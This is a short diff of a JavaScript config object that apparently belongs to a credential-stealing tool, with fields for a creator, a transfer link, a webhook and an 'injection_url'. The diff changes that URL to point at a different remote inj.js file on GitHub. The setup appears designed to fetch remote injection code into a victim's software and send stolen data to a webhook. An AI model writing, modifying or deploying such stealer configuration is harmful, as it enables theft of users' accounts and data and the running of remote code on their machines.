@@ -19,7 +19,7 @@ var config = {
 
     creator: "Ayhu",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/inj.js",
+    injection_url: "https://github.com/Reaper513/injection./blob/main/inj.js",
     webhook: "%WEBHOOK%",
     Placed: "%API_URL%",
     Filter: {
